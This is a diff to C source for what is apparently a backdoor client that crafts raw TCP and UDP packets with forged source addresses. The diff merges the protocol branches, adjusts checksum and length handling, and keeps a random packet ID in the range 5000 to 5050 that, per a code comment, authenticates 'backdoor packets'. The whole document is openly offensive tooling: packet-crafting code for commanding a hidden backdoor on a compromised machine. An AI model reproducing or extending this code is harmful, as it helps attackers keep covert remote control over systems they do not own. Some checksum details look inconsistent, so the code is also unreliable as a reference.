@@ -41,8 +41,8 @@ void backdoor_client(uint32 srcip, uint32 destip, char* protocol)
 		perror("Invalid IP Address");
 	}
 
-	if((strcmp(protocol,"TCP") != 0) && (strcmp(protocol,"UDP") != 0)
-			&& (strcmp(protocol,"tcp") != 0) && (strcmp(protocol,"udp") != 0)) {
+	 if((strcmp(protocol,"TCP") != 0) && (strcmp(protocol,"UDP") != 0)
+	            && (strcmp(protocol,"tcp") != 0) && (strcmp(protocol,"udp") != 0)) {
 		perror("Invalid Protocol");
 	}
 
@@ -93,7 +93,7 @@ client *client_new(void) {
 	c->source_host = 0;
 	c->source_port = 0;
 	c->dest_host = 0;
-	c->dest_port = 80; 	// DEFAULT PORT TO SEND PACKETS TO
+	c->dest_port = 0;
 	return c;
 }
 
@@ -101,7 +101,8 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 	int randomID = 0;
 
-	if((strcmp(protocol,"TCP") == 0) || (strcmp(protocol,"tcp") == 0))	{
+	 if((strcmp(protocol,"TCP") == 0) || (strcmp(protocol,"tcp") == 0)) {
+		// IP header fields
 		packets_tcp.ip.version = 4;
 		packets_tcp.ip.ihl = 5;
 		packets_tcp.ip.tos = 0;
@@ -112,26 +113,11 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 		packets_tcp.ip.protocol = IPPROTO_TCP;
 
-	} else if((strcmp(protocol,"UDP") == 0) || (strcmp(protocol,"udp") == 0)) {
-
-		packets_udp.ip.version = 4;
-		packets_udp.ip.ihl = 5;
-		packets_udp.ip.tos = 0;
-		packets_udp.ip.tot_len = 0;
-		packets_udp.ip.id = 0;
-		packets_udp.ip.frag_off = htons(0x4000);
-		packets_udp.ip.ttl = 64;
-
-		packets_udp.ip.protocol = IPPROTO_UDP;
-	}
-
-
-	if((strcmp(protocol,"TCP") == 0) || (strcmp(protocol,"tcp") == 0))	{
-
 		packets_tcp.ip.check = 0;
 		packets_tcp.ip.saddr = c->source_host;
 		packets_tcp.ip.daddr = c->dest_host;
 
+		// initial TCP header fields
 		packets_tcp.tcp.source = 0;
 		packets_tcp.tcp.dest = 0;
 		packets_tcp.tcp.seq = 0;
@@ -156,33 +142,11 @@ void packet_new(client *c, char *msg, char* protocol) {
 		//encrypt(SEKRET, msg, sizeof(msg));
 		strcpy(packets_tcp.data, msg);
 
-	} else if((strcmp(protocol,"UDP") == 0) || (strcmp(protocol,"udp") == 0)) {
-
-		packets_udp.ip.check = 0;
-		packets_udp.ip.saddr = c->source_host;
-		packets_udp.ip.daddr = c->dest_host;
-
-		packets_udp.udp.source = 53;
-		packets_udp.udp.dest = 5050;
-		//c->source_port = 53;
-		c->dest_port = 53;
-		packets_udp.udp.len = 0;
-		packets_udp.udp.check = 0;
-
-		// Add the data to the datagram
-		// encrypt data
-		//encrypt(SEKRET, msg, sizeof(msg));
-		strcpy(packets_udp.data, msg);
-	}
-
-
-	if((strcmp(protocol,"TCP") == 0) || (strcmp(protocol,"tcp") == 0))	{
 		packets_tcp.tcp.source = htons(c->source_port);
 
 		packets_tcp.tcp.dest = htons(c->dest_port);
 
 		packets_tcp.tcp.seq = 1 + (int) (10000.0 * rand() / (RAND_MAX + 1.0));
-
 
 		// generate random id between 5000 and 5050 used to authenticate backdoor packets
 		randomID = randomRange(5000, 5050);
@@ -190,11 +154,46 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 
 		packets_tcp.ip.tot_len = ((4 * packets_tcp.ip.ihl) + (4 * packets_tcp.tcp.doff)
-			+ strlen(packets_tcp.data));
+				+ strlen(packets_tcp.data));
 
 		packets_tcp.ip.check = in_cksum((unsigned short *) &packets_tcp.ip, 20);
 
-	}else if((strcmp(protocol,"UDP") == 0) || (strcmp(protocol,"udp") == 0))	{
+
+		// PSEUDO Header fields
+		pseudo_header_tcp.source_address = packets_tcp.ip.saddr;
+		pseudo_header_tcp.dest_address = packets_tcp.ip.daddr;
+		pseudo_header_tcp.placeholder = 0;
+		pseudo_header_tcp.protocol = IPPROTO_TCP;
+		pseudo_header_tcp.tcp_length = htons(20);
+
+		bcopy((char *) &packets_tcp.tcp, (char *) &pseudo_header_tcp.tcp, 20);
+		/* Final checksum on the entire package */
+		packets_tcp.tcp.check = in_cksum((unsigned short *) &pseudo_header_tcp, 32);
+
+	} else if((strcmp(protocol,"UDP") == 0) || (strcmp(protocol,"udp") == 0)) {
+
+		packets_udp.ip.version = 4;
+		packets_udp.ip.ihl = 5;
+		packets_udp.ip.tos = 0;
+		packets_udp.ip.tot_len = 0;
+		packets_udp.ip.id = 0;
+		packets_udp.ip.frag_off = htons(0x4000);
+		packets_udp.ip.ttl = 64;
+
+		packets_udp.ip.protocol = IPPROTO_UDP;
+
+		packets_udp.ip.check = 0;
+		packets_udp.ip.saddr = c->source_host;
+		packets_udp.ip.daddr = c->dest_host;
+
+		//UDP header fields
+		packets_udp.udp.len = 0;
+		packets_udp.udp.check = 0;
+
+		// Add the data to the datagram
+		// encrypt data
+		//encrypt(SEKRET, msg, sizeof(msg));
+		strcpy(packets_udp.data, msg);
 
 		packets_udp.udp.source = htons(c->source_port);
 
@@ -210,24 +209,9 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 		packets_udp.ip.check = in_cksum((unsigned short *) &packets_udp.ip, 20);
 
-		packets_udp.udp.len = ((4 * packets_udp.ip.ihl) + sizeof(packets_udp.udp) - strlen(packets_udp.data));
+		packets_udp.udp.len = htons(sizeof(packets_udp.udp));
 
-	}
-
-
-	if((strcmp(protocol,"TCP") == 0) || (strcmp(protocol,"tcp") == 0))	{
-		pseudo_header_tcp.source_address = packets_tcp.ip.saddr;
-		pseudo_header_tcp.dest_address = packets_tcp.ip.daddr;
-		pseudo_header_tcp.placeholder = 0;
-		pseudo_header_tcp.protocol = IPPROTO_TCP;
-		pseudo_header_tcp.tcp_length = htons(20);
-
-		bcopy((char *) &packets_tcp.tcp, (char *) &pseudo_header_tcp.tcp, 20);
-		/* Final checksum on the entire package */
-		packets_tcp.tcp.check = in_cksum((unsigned short *) &pseudo_header_tcp, 32);
-
-	} else if((strcmp(protocol,"UDP") == 0) || (strcmp(protocol,"udp") == 0))	{
-
+		// UDP Pseudo header fields
 		pseudo_header_udp.source_address = packets_udp.ip.saddr;
 		pseudo_header_udp.dest_address = packets_udp.ip.daddr;
 		pseudo_header_udp.placeholder = 0;
@@ -238,7 +222,8 @@ void packet_new(client *c, char *msg, char* protocol) {
 
 		bcopy((char *) &packets_udp.udp, (char *) &pseudo_header_udp.udp, 20);
 		/* Final checksum on the entire package */
-		packets_udp.udp.check = in_cksum((unsigned short *) &pseudo_header_udp, 32);
+		packets_udp.udp.check = in_cksum((unsigned short *) &pseudo_header_udp, 8);
+
 	}
 
 }
@@ -249,7 +234,7 @@ void send_packets(client *c, char *input, char* protocol) {
 
 	packet_new(c, input, protocol);
 
-	if((strcmp(protocol,"TCP") == 0) || (strcmp(protocol,"tcp") == 0))	{
+	 if((strcmp(protocol,"TCP") == 0) || (strcmp(protocol,"tcp") == 0)) {
 		sin.sin_family = AF_INET;
 		sin.sin_port = packets_tcp.tcp.dest;
 		sin.sin_addr.s_addr = packets_tcp.ip.daddr;
@@ -264,7 +249,7 @@ void send_packets(client *c, char *input, char* protocol) {
 
 		close(send_socket);
 
-	} else if((strcmp(protocol,"UDP") == 0) || (strcmp(protocol,"udp") == 0))	{
+	} else if((strcmp(protocol,"UDP") == 0) || (strcmp(protocol,"udp") == 0)) {
 		sin.sin_family = AF_INET;
 		sin.sin_port = packets_udp.udp.dest;
 		sin.sin_addr.s_addr = packets_udp.ip.daddr;
